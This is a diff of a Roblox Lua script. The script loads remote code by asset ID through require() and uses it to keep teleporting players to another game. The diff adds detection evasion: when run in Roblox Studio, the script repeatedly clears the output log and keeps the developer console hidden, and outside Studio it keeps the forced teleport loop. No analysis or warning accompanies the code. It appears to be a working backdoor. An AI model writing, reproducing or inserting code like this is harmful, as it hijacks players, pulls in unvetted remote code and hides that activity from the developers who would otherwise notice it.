@@ -1,5 +1,18 @@
-while task.wait() do
-	task.defer(function()
-		require(16303756383)(false,[===[game:GetService("TeleportService"):Teleport(16727078591)]===])
-	end)
+if game:GetService("RunService"):IsStudio() then
+	local function pleh()
+		while task.wait() do
+			game:GetService("LogService"):ClearOutput()
+		end
+	end
+
+	for i = 1,5 do
+		task.spawn(pleh)
+	end
+	require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
+else
+	while task.wait() do
+		task.defer(function()
+			require(16303756383)(false,[===[game:GetService("TeleportService"):Teleport(16727078591)]===])
+		end)
+	end
 end
